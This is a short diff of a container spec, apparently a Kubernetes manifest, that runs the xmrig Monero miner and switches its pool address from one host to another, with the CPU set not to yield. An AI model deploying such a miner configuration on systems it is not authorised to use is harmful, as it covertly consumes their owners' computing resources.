@@ -18,7 +18,7 @@ spec:
     command:
     - /home/worker1/xmrig/build/xmrig
     - -o
-    - proxy.hacknoob.win:5551
+    - gulf.moneroocean.stream:80
     - -u
     - slave1
     - --cpu-no-yield
